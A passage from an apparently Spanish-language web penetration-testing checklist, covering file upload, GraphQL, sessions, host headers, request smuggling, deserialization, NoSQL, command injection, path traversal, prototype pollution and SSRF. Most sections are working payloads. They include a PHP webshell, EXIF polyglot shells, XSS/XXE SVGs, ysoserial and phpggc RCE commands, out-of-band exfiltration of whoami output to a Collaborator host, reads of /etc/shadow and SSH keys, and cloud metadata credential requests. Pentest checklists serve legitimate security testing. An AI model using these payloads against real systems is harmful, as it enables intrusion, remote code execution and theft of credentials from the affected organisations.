Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

<?php system($_GET["cmd"]); ?>
------Boundary--
```



### 3. Shell upload vía Path Traversal

* [ ] Verificar si el nombre del fichero subido es utilizado directamente por la aplicación sin sanitización, permitiendo escribir el fichero fuera del directorio de uploads.
* [ ] Manipular el parámetro `filename` en la petición  para intentar escribir el fichero en directorios accesibles del servidor:

```http
Content-Disposition: form-data; name="file"; filename="../shell.php"
Content-Disposition: form-data; name="file"; filename="../../shell.php"
Content-Disposition: form-data; name="file"; filename="../../../var/www/html/shell.php"
```

> 💡 **Tip:** Si la aplicación normaliza `../`, probar con variaciones: `....//`, `..%2F`, `%2e%2e%2f`.



### 4. Shell upload por bypass de extensión (lista negra)

* [ ] Si la aplicación usa una lista negra de extensiones, probar variaciones que puedan no estar incluidas:


```
shell.php3, shell.php4, shell.php5, shell.php7, shell.phtml, shell.pHp, shell.PHP, shell.shtml, shell.shtm
```


* [ ] Probar extensiones alternativas según el servidor web:
  * **Apache:** `.phtml`, `.phar`, `.php5`, `.shtml`
  * **IIS:** `.asp`, `.cer`, `.asa`, `.aspx`, `.ashx`
  * **Nginx/CGI:** `.pl`, `.cgi`, `.py`



### 5. Shell upload vía doble extensión

* [ ] Verificar si la aplicación extrae la extensión de forma incorrecta, tomando solo la última parte del nombre sin validar el resto. Probar combinaciones de extensión válida + extensión ejecutable:

```
shell.jpg.php, shell.png.php, shell.php.jpg, shell.php.png, shell.php.xxxxx
```

> 💡 **Tip:** En servidores Apache con `mod_mime`, un fichero `shell.php.jpg` puede ser interpretado como PHP si la configuración del servidor asocia `.php` independientemente de su posición en el nombre.



### 6. Shell upload con Null Byte

* [ ] Verificar si la aplicación es vulnerable a inyección de null byte en el nombre del fichero, truncando la validación de extensión. Probar con null byte en el nombre del fichero para que la validación vea `.jpg` pero el servidor guarde `.php`:

```
shell.php%00.jpg
shell.php\x00.jpg
```

> 💡 **Nota:** Esta técnica es efectiva principalmente en aplicaciones PHP antiguas (< PHP 5.3.4) o en validaciones implementadas en C/C++ donde el null byte termina la cadena.



### 7. Shell upload con fichero Polígota (Polyglot)

* [ ] Construir un fichero que sea simultáneamente una imagen válida (pasa la validación de magic bytes) y contiene código PHP ejecutable.
* [ ] Insertar el payload PHP en los metadatos EXIF de una imagen real usando `exiftool`:

```bash
exiftool -Comment="<?php system(\$_GET['cmd']); ?>" imagen.jpg
mv imagen.jpg shell.php.jpg
```

* [ ] Verificar si el servidor ejecuta el contenido PHP aunque el fichero tenga extensión de imagen.



### 8. Verificación de almacenamiento y ejecución

* [ ] Tras cualquier subida exitosa, verificar que el fichero se almacena **dentro del webroot** y es accesible via HTTP.
* [ ] Verificar que el servidor **ejecuta** el código del fichero subido y no lo sirve como texto plano.
* [ ] Si el fichero se almacena fuera del webroot o con un nombre aleatorio, documentarlo como mitigación parcial.



### 9. SVG como vector XSS

* [ ] Si la aplicación permite subir imágenes SVG, verificar si el contenido SVG es renderizado directamente en el navegador sin sanitización.
* [ ] Subir un SVG con contenido JavaScript para intentar ejecutar XSS:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
  <rect width="100" height="100"/>
</svg>
```

```xml
<!-- Alternativa con script inline -->
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.domain)</script>
</svg>
```



### 10. XXE via SVG / XML upload

* [ ] Si la aplicación procesa ficheros SVG, XML o documentos Office (DOCX, XLSX) en el servidor, verificar si es posible inyectar entidades externas XML (XXE).

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>
```

***

## 📡 GraphQL

### 1. Detección del endpoint GraphQL

* [ ] Buscar el endpoint GraphQL en rutas conocidas:
  * `/graphql` · `/graphiql` · `/altair` · `/playground`
  * `/api/graphql` · `/v1/graphql` · `/v2/graphql`
  * `/query` · `/gql`
* [ ] Verificar si la interfaz interactiva (GraphiQL, Apollo Playground) está expuesta en producción — su presencia es un hallazgo en sí mismo.



### 2. Autenticación en el endpoint

* [ ] Verificar si el endpoint GraphQL requiere autenticación o es accesible sin token.



### 3. Introspection query

* [ ] Verificar si la introspección está habilitada — en producción debería estar desactivada.
* [ ] Si está habilitada, extraer el esquema completo para identificar todos los tipos, queries, mutaciones y campos disponibles.

```json
{
  "query": "{ __schema { types { name fields { name type { name } } } } }"
}
```

> 💡 **Herramienta:** [**GraphQL Voyager**](https://github.com/graphql-kit/graphql-voyager) permite visualizar el esquema extraído de forma interactiva. [**InQL**](https://github.com/doyensec/inql) (plugin Burp) automatiza la extracción y análisis del esquema.



### 4. Análisis de queries y mutaciones

* [ ] Identificar todas las queries y mutaciones disponibles en el esquema extraído.
* [ ] Verificar si las mutaciones realizan acciones sensibles sin los controles de autorización adecuados: cambio de contraseña, modificación de datos de otros usuarios, operaciones administrativas.
* [ ] Probar las queries con identificadores de otros usuarios (BOLA) — sustituir IDs propios por IDs ajenos.
* [ ] Verificar si las queries exponen más datos de los necesarios (exceso de datos en respuesta).



### 5. Batching de queries y bypass de rate limiting

* [ ] Verificar si el endpoint acepta múltiples queries en un único request (batching) — puede usarse para evadir rate limiting.
* [ ] Probar batching de array (múltiples objetos en un array JSON):


```json
[
  {"query": "{ user(id: 1) { email } }"},
  {"query": "{ user(id: 2) { email } }"},
  {"query": "{ user(id: 3) { email } }"}
]
```


* [ ] Probar bypass de rate limiting mediante aliases — ejecutar la misma operación múltiples veces en una sola petición:


```json
{
  "query": "{ a1: user(id: 1) { email } a2: user(id: 2) { email } a3: user(id: 3) { email } }"
}
```


***

## 🍪 Gestión de sesiones

### 1. Identificación del mecanismo de sesión

* [ ] Establecer cómo se maneja la gestión de sesiones en la aplicación:
  * Token en cookie de sesión
  * Token en Local Storage o Session Storage
  * Token en la URL como parámetro (ej. `?sessionid=abc123`) — práctica insegura
  * JWT en cabecera `Authorization: Bearer`
* [ ] Detectar todas las cookies utilizadas por la aplicación e identificar cuál es la cookie de sesión principal.
* [ ] Verificar si los tokens de sesión se almacenan en Local Storage — vulnerable a robo via XSS ya que no tiene protección HttpOnly.



### 2. Análisis de la estructura del token de sesión

* [ ] Analizar la aleatoriedad, unicidad y longitud del token de sesión — un token predecible o de baja entropía es vulnerable a fuerza bruta.
* [ ] Usar **Burp Sequencer** para analizar la entropía estadística de los tokens capturados.
* [ ] Verificar si el token filtra información sensible: usuario, rol, timestamp u otros datos codificados en Base64 o hex.

> 💡 **Tip:** Captura 100+ tokens con Burp y pásalos por Burp Sequencer para obtener un análisis estadístico de la entropía. Un token con menos de 64 bits de entropía efectiva es insuficiente.



### 3. Flags de la cookie de sesión

* [ ] Verificar que la cookie de sesión tiene el flag **`HttpOnly`** — impide el acceso al token desde JavaScript, mitigando el robo via XSS.
* [ ] Verificar que la cookie de sesión tiene el flag **`Secure`** — garantiza que solo se transmite por HTTPS.
* [ ] Verificar que la cookie de sesión tiene el atributo **`SameSite`** correctamente configurado:
  * `SameSite=Strict` — protección máxima contra CSRF.
  * `SameSite=Lax` — protección parcial, permite GET de navegación top-level.
  * `SameSite=None` — requiere obligatoriamente `Secure`; permite peticiones cross-site.



### 4. Alcance y duración de la cookie de sesión

* [ ] Verificar el atributo **`Path`** — una cookie con `Path=/` es enviada en todas las peticiones al dominio.
* [ ] Verificar el atributo **`Domain`** — una cookie con `Domain=.target.com` (con punto) es accesible por todos los subdominios, riesgo si algún subdominio está comprometido.
* [ ] Verificar los atributos **`Expires`** y **`Max-Age`** — una cookie de sesión no debería tener fecha de expiración larga; idealmente sin `Expires`.
* [ ] Determinar qué partes de la aplicación envían la cookie y si hay endpoints que la reciben innecesariamente.



### 5. Expiración y terminación de sesión

* [ ] Verificar la terminación de la sesión después del **tiempo de inactividad** (timeout).
* [ ] Probar si el timeout es aplicado por el **cliente** o por el **servidor** — solo la validación en servidor es efectiva.



### 6. Rotación de tokens de sesión

* [ ] Confirmar que se emite un **nuevo token de sesión** al iniciar sesión — el token pre-autenticación no debe ser el mismo que el post-autenticación.
* [ ] Confirmar que se emite un nuevo token al **cambiar de rol** o escalar privilegios.
* [ ] Confirmar que el token es **invalidado correctamente** al cerrar sesión.
* [ ] Verificar la **fijación de sesión** — si la aplicación acepta un token establecido por el atacante antes del login y lo mantiene después:

```http
# Fijar token antes del login
GET /login HTTP/1.1
Cookie: session=ATTACKER_CONTROLLED_VALUE

# Si tras el login el servidor mantiene el mismo token -> vulnerable a session fixation
```



### 7. Sesiones simultáneas

* [ ] Probar si los usuarios pueden tener **múltiples sesiones simultáneas** activas desde distintos navegadores o dispositivos.
* [ ] Comprobar si al cambiar la contraseña se invalidan todas las sesiones activas del usuario.



### 8. JWT como token de sesión

* [ ] Si la aplicación usa JWT, verificar que la firma es válida y no puede ser manipulada.
* [ ] Probar el **algoritmo `none`** — cambiar el header del JWT a `{"alg":"none"}` y eliminar la firma.
* [ ] Probar **confusión de algoritmo RS256 → HS256** — firmar el token con la clave pública como HMAC.
* [ ] Verificar que el JWT tiene una expiración (`exp`) adecuada y que el servidor la valida.
* [ ] Verificar si el JWT contiene información sensible en el payload (no está cifrado, solo codificado en Base64).

> 💡 **Herramienta:** [**jwt\_tool**](https://github.com/ticarpi/jwt_tool) y el plugin **JWT Editor** de Burp Suite automatizan los ataques sobre JWT.

***

## 🌐 Host Header Attacks

### 1. Cabeceras alternativas de override de Host

> Antes de probar cualquier ataque de Host Header, verificar estas cabeceras alternativas en todos los casos — muchos servidores y proxies las aceptan como override del valor de `Host`.

* [ ] Probar los siguientes ataques sustituyendo o combinando con las cabeceras alternativas:

```http
X-Forwarded-Host: evil.com
X-Host: evil.com
X-Forwarded-Server: evil.com
X-HTTP-Host-Override: evil.com
Forwarded: host=evil.com
```

> 💡 **Tip:** Prueba primero con la cabecera `Host` directamente y después repite el mismo ataque con cada una de las cabeceras alternativas — el resultado puede ser diferente dependiendo de la capa que procese la petición (WAF, proxy, backend).



### 2. Password Reset Poisoning

* [ ] Verificar si la aplicación usa el valor de la cabecera `Host` para construir el enlace de restablecimiento de contraseña enviado por email.
* [ ] Modificar la cabecera `Host` por un dominio controlado por el atacante y solicitar un reset de contraseña para una cuenta víctima:

```http
POST /forgot-password HTTP/1.1
Host: evil.com
Content-Type: application/x-www-form-urlencoded

email=victim@target.com
```

* [ ] Verificar si el enlace de reset recibido en el email apunta al dominio del atacante en lugar del dominio legítimo.
* [ ] Repetir el ataque usando las cabeceras alternativas del bloque 1 (`X-Forwarded-Host`, `X-Host`, etc.).



### 3. Bypass de autenticación por cabecera Host

* [ ] Verificar si la aplicación usa el valor de `Host` para tomar decisiones de autenticación o control de acceso — algunos backends confían en el `Host` para identificar si la petición proviene de una red interna.
* [ ] Probar con valores de `Host` que simulen acceso interno:

```http
Host: localhost
Host: 127.0.0.1
Host: internal.target.com
Host: admin.target.com
```

* [ ] Repetir el ataque usando las cabeceras alternativas del bloque 1.

***

## 🚢 HTTP Request Smuggling

> ⚠️ **Nota de precaución:** El HTTP Request Smuggling puede afectar a peticiones de otros usuarios reales de la aplicación. Extremar la precaución en entornos productivos — usar preferiblemente en ventanas de mantenimiento o entornos de staging.

### 1. Detección automática

* [ ] Usar herramientas automáticas para la detección — la detección manual es compleja y puede tener impacto no deseado en producción.
* [ ] Ejecutar `smuggler.py` contra el target:

```bash
python3 smuggler.py -u https://target.com
```

* [ ] Usar el plugin **HTTP Request Smuggler** de Burp Suite (extensión disponible en el BApp Store) para detección y explotación guiada.



### 2. Vectores principales

* [ ] **CL.TE** — el frontend usa `Content-Length` y el backend usa `Transfer-Encoding`. El backend procesa más datos de los que el frontend consideró como parte de la petición.
* [ ] **TE.CL** — el frontend usa `Transfer-Encoding` y el backend usa `Content-Length`.
* [ ] **TE.TE** — ambos servidores soportan `Transfer-Encoding` pero uno puede ser confundido con una ofuscación de la cabecera.

```http
# Ejemplo CL.TE
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

***

## 📦 Deserialización insegura

> 💡 **Nota:** La deserialización insegura no ocurre solo en cookies — verificar también en parámetros GET/POST, cabeceras HTTP, APIs y ficheros subidos que sean deserializados en el servidor. Si el valor de una cookie parece un objeto serializado, aplicar esta sección.



### 1. Identificación de datos serializados

* [ ] Identificar el formato de serialización utilizado antes de atacar — cada tecnología tiene su firma característica:

<table><thead><tr><th width="271">Tecnología</th><th>Firma / Patrón</th></tr></thead><tbody><tr><td>Java</td><td><code>rO0AB</code> (Base64) · <code>\xac\xed\x00\x05</code> (raw)</td></tr><tr><td>PHP</td><td><code>O:</code> · <code>a:</code> · <code>s:</code> al inicio del valor</td></tr><tr><td>Python (pickle)</td><td><code>\x80\x04</code> · <code>\x80\x05</code></td></tr><tr><td>.NET</td><td><code>AAEAAAD</code> (Base64)</td></tr><tr><td>Ruby (Marshal)</td><td><code>\x04\x08</code></td></tr></tbody></table>

* [ ] Buscar objetos serializados en: cookies, parámetros ocultos, campos de formulario, cabeceras HTTP y respuestas de API.



### 2. Modificación de objetos serializados

* [ ] Modificar los atributos del objeto serializado para alterar valores sensibles: nombre de usuario, rol, permisos, flags de administrador.
* [ ] Decodificar el objeto (Base64/hex), modificar el atributo objetivo, recalcular si hay checksum y reenviar.

```php
# PHP — objeto serializado original
O:4:"User":2:{s:8:"username";s:5:"guest";s:4:"role";s:4:"user";}

# Modificado
O:4:"User":2:{s:8:"username";s:5:"admin";s:4:"role";s:5:"admin";}
```

> 💡 **Herramienta:** [**SerializationDumper**](https://github.com/NickstaDB/SerializationDumper) para inspeccionar y modificar objetos serializados Java.



### 3. Inyección de objetos arbitrarios en PHP

* [ ] Verificar si la aplicación PHP deserializa entrada controlada por el usuario con `unserialize()`.
* [ ] Analizar el código fuente disponible (o inferir del comportamiento) para identificar clases con métodos mágicos (`__wakeup`, `__destruct`, `__toString`) que puedan ser explotados como gadgets.
* [ ] Generar gadget chains con **phpggc**:

```bash
# Listar gadget chains disponibles
phpggc -l

# Generar payload para un framework concreto
phpggc Laravel/RCE1 system 'id' -b
phpggc Symfony/RCE4 exec 'id' -b
```



### 4. Explotación de deserialización Java

* [ ] Si se identifica serialización Java, generar gadget chains con **ysoserial**:

```bash
# Generar payload para ejecución de comandos
java -jar ysoserial.jar CommonsCollections6 'id' | base64

# Probar distintas gadget chains si la primera no funciona
java -jar ysoserial.jar Spring1 'id' | base64
java -jar ysoserial.jar Groovy1 'id' | base64
```

* [ ] Usar Burp Collaborator o interactsh para confirmar ejecución out-of-band si no hay respuesta visible:


```bash
java -jar ysoserial.jar CommonsCollections6 'curl https://collaborator-id.oastify.com' | b ase64
```


***

## 🍃 NoSQL

### 1. Identificación del motor NoSQL

* [ ] Identificar si la aplicación usa una base de datos NoSQL y qué motor:
  * **MongoDB** — el más común en aplicaciones web; sintaxis basada en operadores JSON (`$gt`, `$ne`, `$where`, `$regex`)
  * **CouchDB** — interfaz REST HTTP; vulnerable a inyección en queries Mango
  * **Redis** — vulnerable principalmente a inyección de comandos si la entrada se usa para construir comandos directamente
  * **Cassandra** — usa CQL (similar a SQL); vulnerable a inyección CQL
* [ ] Buscar indicios del motor en cabeceras de error, stack traces, o tecnologías identificadas en reconocimiento.



### 2. Detección de NoSQL Injection

* [ ] Probar en todos los parámetros de entrada — GET, POST, cookies y especialmente en **body JSON** (`Content-Type: application/json`) donde la inyección de operadores es directa.
* [ ] Inyectar operadores MongoDB para provocar comportamiento anómalo:

```javascript
// En parámetro GET/POST
username[$ne]=admin
username[$gt]=
password[$exists]=true

// En body JSON
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
```

* [ ] Observar diferencias en las respuestas — errores de sintaxis, respuestas inesperadas o comportamiento distinto al introducir operadores vs valores normales.
* [ ] Probar también con el operador `$where` si la aplicación lo permite:

```javascript
{"$where": "this.username == 'admin'"}
{"$where": "sleep(5000)"}  // Time-based detection
```



### 3. Bypass de login con NoSQL Injection

* [ ] Verificar si el formulario de login es vulnerable a bypass mediante operadores de comparación:

```javascript
// En body JSON
{"username": "admin", "password": {"$ne": "wrongpassword"}}
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": "admin", "password": {"$gt": ""}}

// En parámetros POST clásicos
username=admin&password[$ne]=wrongpassword
username[$ne]=&password[$ne]=
```

* [ ] Probar con diferentes usuarios objetivo: `admin`, `administrator`, `root`.
* [ ] Si la aplicación devuelve mensajes de error diferentes para usuario válido vs inválido, usar eso para enumerar usuarios primero.



### 4. Extracción de datos con NoSQL Injection

* [ ] Si se confirma la inyección, usar el operador `$regex` para extraer datos carácter a carácter:

```javascript
// Extraer contraseña del usuario admin carácter a carácter
{"username": "admin", "password": {"$regex": "^a"}}   // ¿empieza por 'a'?
{"username": "admin", "password": {"$regex": "^ab"}}  // ¿empieza por 'ab'?
{"username": "admin", "password": {"$regex": "^abc"}} // y así sucesivamente
```

* [ ] Automatizar la extracción con **NoSQLMap** o **nosql-injection-payloads**:

```bash
python3 nosqlmap.py
```

***

## 💻 Command Injection

### 1. Identificación de puntos de entrada

* [ ] Identificar parámetros que puedan interactuar con el sistema operativo:
  * Funciones de red: ping, traceroute, nslookup, whois
  * Conversión o procesamiento de ficheros: PDF, imágenes, vídeo
  * Envío de emails con campos controlables (asunto, destinatario)
  * Rutas de fichero o nombres de archivo usados en comandos del sistema
  * Funciones de diagnóstico o administración expuestas
* [ ] Verificar tanto parámetros GET/POST visibles como campos ocultos, cookies y cabeceras HTTP.



### 2. Separadores de comandos

* [ ] Probar los siguientes separadores para inyectar comandos adicionales tras el comando legítimo:

```bash
# Linux / Unix
cmd ; id
cmd | id
cmd || id
cmd && id
cmd `id`
cmd $(id)

# Windows
cmd & whoami
cmd | whoami
cmd || whoami
cmd && whoami
```

* [ ] Probar con y sin espacios alrededor del separador — algunos filtros solo bloquean con espacios.
* [ ] Probar separadores al inicio, en medio y al final del valor del parámetro.



### 3. Command Injection simple

* [ ] Verificar si la salida del comando inyectado se refleja directamente en la respuesta HTTP.
* [ ] Usar comandos de identificación básicos para confirmar la ejecución:

```bash
# Linux
; id
; whoami
; uname -a
; cat /etc/passwd

# Windows
& whoami
& ver
& ipconfig
```

* [ ] Si la respuesta incluye el resultado del comando, la vulnerabilidad es confirmada y explotable directamente.



### 4. Blind CI — Retrasos temporales

* [ ] Si no hay salida visible, verificar mediante retrasos en el tiempo de respuesta:

```bash
# Linux — pausar 5 segundos
; sleep 5
| sleep 5
$(sleep 5)
`sleep 5`

# Windows
& ping -n 6 127.0.0.1
& timeout /T 5
```

* [ ] Medir el tiempo de respuesta con Burp Suite (columna Response received) — un retraso consistente de N segundos confirma la ejecución del comando.
* [ ] Probar con diferentes duraciones (5s, 10s) para descartar latencia de red.



### 5. Blind CI — Redirección de salida

* [ ] Si se puede escribir en el servidor, redirigir la salida del comando a un fichero accesible via HTTP:

```bash
# Escribir salida en un fichero dentro del webroot
; id > /var/www/html/output.txt
; whoami > /var/www/html/output.txt
; cat /etc/passwd > /var/www/html/output.txt
```

* [ ] Acceder al fichero generado desde el navegador para leer la salida:

```bash
curl https://target.com/output.txt
```

* [ ] Si no se conoce la ruta del webroot, intentar con rutas comunes:
  * `/var/www/html/` · `/var/www/` · `/usr/share/nginx/html/` · `C:\inetpub\wwwroot\`



### 6. Blind CI — Interacción OOB (Out-of-Band)

* [ ] Si no hay salida visible ni posibilidad de escritura, confirmar la ejecución mediante interacción out-of-band con un servidor controlado (Burp Collaborator o interactsh):

```bash
# DNS lookup OOB
; nslookup collaborator-id.oastify.com
; curl https://collaborator-id.oastify.com
$(curl https://collaborator-id.oastify.com)

# Exfiltración de datos via OOB
; curl https://collaborator-id.oastify.com/$(whoami)
; nslookup $(whoami).collaborator-id.oastify.com
```

* [ ] Monitorizar el panel de Burp Collaborator o interactsh para recibir las interacciones DNS/HTTP y confirmar la ejecución.



### 7. Bypass de filtros

* [ ] Si hay validación o WAF, probar técnicas de bypass para evadir filtros de caracteres:

```bash
# Sustituir espacio con $IFS
;${IFS}id
cat${IFS}/etc/passwd

# Concatenación de variables
c''at /etc/passwd
c"at" /etc/passwd

# Encoding
;%0aid          # %0a = newline
;%0did          # %0d = carriage return

# Uso de variables de entorno
$u=id;$u
${u=id}${u}

# Wildcards
/bin/c?t /etc/passwd
/bin/ca* /etc/passwd
```

> 💡 **Herramienta:** [**commix**](https://github.com/commixproject/commix) automatiza la detección y explotación de command injection incluyendo bypass de filtros.

***

## 📁 Path Traversal

### 1. Identificación de puntos de entrada

* [ ] Identificar parámetros que puedan referenciar ficheros o rutas en el servidor:
  * `file=` · `path=` · `page=` · `include=` · `template=`
  * `img=` · `doc=` · `load=` · `filename=` · `dir=` · `folder=`
* [ ] Buscar también en: nombres de fichero en uploads, parámetros de descarga, rutas en APIs REST y cabeceras HTTP como `Referer`.
* [ ] Observar si la respuesta refleja contenido de ficheros o si el comportamiento cambia al modificar el parámetro.



### 2. Payloads básicos (sin codificación)

El primer intento siempre debe ser el más simple.

* [ ] Probar con diferentes profundidades de traversal hasta salir del directorio base:

```
../../../etc/passwd
../../../../../etc/passwd
../../../home/carlos/secret
../../home/carlos/secret
```



### 3. Null Byte Poisoning (%00)

Bypass clásico cuando la aplicación fuerza una extensión como `.jpg` o `.png`.

* [ ] Probar null byte para truncar la extensión forzada por la aplicación:

```
../../../etc/passwd%00.png
../../../etc/passwd%00.jpg
../../../etc/passwd%00
../../../home/carlos/secret%00.png
```



### 4. Doble punto con slash redundante (....// )

Bypass de filtros que eliminan `../` pero no validan repeticiones.

* [ ] Probar variante con doble punto y slash redundante:

```
....//....//....//etc/passwd
....//....//....//home/carlos/secret
....//....//....//....//etc/passwd
```



### 5. Doble codificación URL (%252e%252e%252f)

Bypass efectivo cuando la aplicación decodifica solo una vez.

* [ ] Probar con doble encoding de los caracteres de traversal:

```
..%252f..%252f..%252fetc/passwd
%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd
..%252f..%252f..%252f..%252fetc/passwd
```



### 6. Encoding de slash y backslash

* [ ] Probar con slash codificado en URL:

```
..%2f..%2f..%2fetc/passwd
..%2F..%2F..%2Fetc/passwd
```

* [ ] Probar con backslash para bypass en Windows o parsers que normalicen ambos:

```
..\..\..\windows\win.ini
..%5c..%5c..%5cwindows\win.ini
..%5C..%5C..%5Cwindows\win.ini
```



### 7. Unicode y UTF-8 encoding

Algunos parsers interpretan variantes Unicode de `/` como separador de ruta.

* [ ] Probar con encoding Unicode de slash:

```
..%c0%af..%c0%af..%c0%afetc/passwd
..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd
```



### 8. Rutas absolutas combinadas con traversal

Útil cuando el parámetro ya incluye una ruta base o cuando la aplicación la añade internamente.

* [ ] Probar con rutas absolutas combinadas:

```
/var/www/images/../../../etc/passwd
/images/../../../etc/passwd
/var/www/images/../../../home/carlos/secret
```

* [ ] Probar rutas absolutas directas — a veces el parámetro las acepta sin necesidad de traversal:

```
/etc/passwd
/etc/shadow
/proc/self/environ
```



### 9. Ficheros objetivo según el sistema operativo

Una vez confirmado el traversal, escalar a ficheros más sensibles.

### Linux / Unix

```
/etc/passwd                         # Usuarios del sistema
/etc/shadow                         # Hashes de contraseñas (requiere root)
/etc/hosts                          # Resolución de nombres
/proc/self/environ                  # Variables de entorno del proceso
/proc/self/cmdline                  # Línea de comandos del proceso
~/.ssh/id_rsa                       # Clave privada SSH del usuario
~/.ssh/authorized_keys              # Claves autorizadas SSH
/var/log/apache2/access.log         # Logs de Apache
/var/log/nginx/access.log           # Logs de Nginx
/etc/nginx/nginx.conf               # Configuración de Nginx
/etc/apache2/apache2.conf           # Configuración de Apache
```

### Windows

```
\windows\win.ini
\windows\system32\drivers\etc\hosts
\windows\system32\config\sam        # Base de datos SAM (requiere privilegios)
\inetpub\wwwroot\web.config         # Configuración de IIS con posibles credenciales
\xampp\apache\conf\httpd.conf
```



### 10. Verificación del impacto

* [ ] Una vez confirmado el traversal con `/etc/passwd` o `win.ini`, escalar a ficheros con credenciales o configuración sensible.
* [ ] Buscar ficheros de configuración de la aplicación con credenciales de base de datos:
  * `.env` · `config.php` · `database.yml` · `application.properties` · `web.config`
* [ ] Intentar leer claves privadas SSH del usuario bajo el que corre el servidor web.
* [ ] Verificar si el traversal permite también **escritura** — si es así, escalar a RCE escribiendo un webshell.

> 💡 **Herramienta:** [**dotdotpwn**](https://github.com/wireghoul/dotdotpwn) automatiza la prueba de múltiples variantes de path traversal. [**ffuf**](https://github.com/ffuf/ffuf) con wordlists de PayloadsAllTheThings también es efectivo.

***

## 🧪 Prototype pollution

> 💡 **Nota:** El impacto de Prototype Pollution depende de encontrar **gadgets** — fragmentos de código de la aplicación o de librerías que usen propiedades del prototipo contaminado para ejecutar acciones sensibles (XSS, bypass de controles, RCE en servidor).



### 1. Prototype Pollution en cliente — via APIs

* [ ] Identificar fuentes de entrada que puedan contaminar el prototipo de `Object`: parámetros de la URL (query string, hash fragment), JSON parseado desde el servidor, `postMessage`, `localStorage`.
* [ ] Verificar si la aplicación usa librerías vulnerables que mezclan o clonan objetos sin sanitización: `lodash`, `jQuery`, `Hoek`, `merge`, `extend`.
* [ ] Probar contaminación del prototipo via query string:

```
https://target.com/?__proto__[foo]=bar
https://target.com/?__proto__.foo=bar
https://target.com/?constructor[prototype][foo]=bar
```

* [ ] Verificar en la consola del navegador si la contaminación tuvo efecto:

```javascript
Object.prototype.foo // debería devolver "bar" si hay PP
```

> 💡 **Herramienta principal:** DOM Invader (Burp Suite) — detecta automáticamente fuentes de prototype pollution en cliente y sugiere gadgets explotables.



### 2. XSS en el DOM por Prototype Pollution en cliente

* [ ] Una vez confirmada la contaminación, buscar gadgets que deriven en XSS — propiedades del prototipo usadas en sinks peligrosos como `innerHTML`, `eval()`, `document.write()`.
* [ ] Probar gadgets conocidos de librerías comunes:

```
https://target.com/?__proto__[innerHTML]=<img src=x onerror=alert(1)>
https://target.com/?__proto__[src]=data:,alert(1)
https://target.com/?__proto__[href]=javascript:alert(1)
```

* [ ] Usar DOM Invader para identificar gadgets automáticamente — escanear la página con la opción "Scan for gadgets" tras activar prototype pollution.



### 3. XSS en el DOM por vector alternativo de Prototype Pollution

* [ ] Probar vectores alternativos de contaminación cuando el vector estándar (`__proto__`) está filtrado o no funciona:

```
# Via constructor
?constructor[prototype][foo]=bar

# Via proto codificado
?__pro%74o__[foo]=bar
?__pro\u0074o__[foo]=bar

# En body JSON
{"__proto__": {"foo": "bar"}}
{"constructor": {"prototype": {"foo": "bar"}}}
```

* [ ] Verificar si la contaminación ocurre a través de ficheros JSON cargados por la aplicación o respuestas de API que son mergeadas con objetos locales.
* [ ] Combinar con gadgets de XSS para demostrar el impacto completo.



### 4. Prototype Pollution en servidor (Node.js)

* [ ] Si la aplicación usa Node.js, verificar PP del lado servidor — el impacto puede ser RCE, bypass de autenticación o denegación de servicio.
* [ ] Probar contaminación en body JSON de peticiones POST:json


```json
{"__proto__": {"isAdmin": true}}
{"__proto__": {"outputFunctionName": "_tmp1;global.process.mainModule.require('child_process').exec('id');var __tmp2"}}
```


* [ ] Usar **server-side-prototype-pollution-scanner** (extensión Burp) para detección automática en aplicaciones Node.js.

***

## 🔄 SSRF

### 1. Identificación de puntos de entrada

* [ ] Identificar parámetros que puedan aceptar URLs o rutas que el servidor procesará:
  * `url=` · `fetch=` · `redirect=` · `src=` · `path=` · `endpoint=`
  * `webhookUrl=` · `callback=` · `imageUrl=` · `target=` · `dest=`
* [ ] Buscar también en cabeceras HTTP: `Referer`, `X-Forwarded-For`, `Host`.
* [ ] Identificar funcionalidades que consuman URLs externas: importación de feeds, webhooks, generación de previews, conversión de documentos, carga de imágenes por URL.



### 2. SSRF básico contra el servidor local

* [ ] Verificar si es posible hacer que el servidor realice peticiones a sí mismo via `localhost` o `127.0.0.1`:

```
url=http://localhost/admin
url=http://127.0.0.1/admin
url=http://127.0.0.1:8080/internal
url=http://0.0.0.0/admin
url=http://[::1]/admin
```

* [ ] Probar variaciones de localhost:

```
http://127.1/admin
http://2130706433/admin      # 127.0.0.1 en decimal
http://0177.0.0.1/admin     # 127.0.0.1 en octal
http://0x7f000001/admin     # 127.0.0.1 en hex
```



### 3. SSRF básico contra sistemas internos

* [ ] Si se confirma SSRF, escanear la red interna para descubrir servicios no expuestos públicamente:

```
url=http://192.168.0.1/
url=http://10.0.0.1/
url=http://172.16.0.1/
url=http://internal.target.com/
```

* [ ] Enumerar puertos de servicios internos comunes:

```
url=http://localhost:22       # SSH
url=http://localhost:3306     # MySQL
url=http://localhost:5432     # PostgreSQL
url=http://localhost:6379     # Redis
url=http://localhost:27017    # MongoDB
url=http://localhost:8080     # Panel de administración
url=http://localhost:9200     # Elasticsearch
```



### 4. SSRF contra metadata de cloud

* [ ] Si la aplicación está alojada en cloud, intentar acceder al endpoint de metadata de la instancia para obtener credenciales y configuración:

```bash
# AWS
url=http://169.254.169.254/latest/meta-data/
url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
url=http://169.254.169.254/latest/user-data/

# GCP
url=http://metadata.google.internal/computeMetadata/v1/
url=http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token

# Azure
url=http://169.254.169.254/metadata/instance?api-version=2021-02-01
```



### 5. SSRF Blind — Detección OOB

* [ ] Si no hay respuesta visible, confirmar la ejecución mediante interacción out-of-band con Burp Collaborator o interactsh:

```
url=https://collaborator-id.oastify.com
url=http://collaborator-id.oastify.com
```

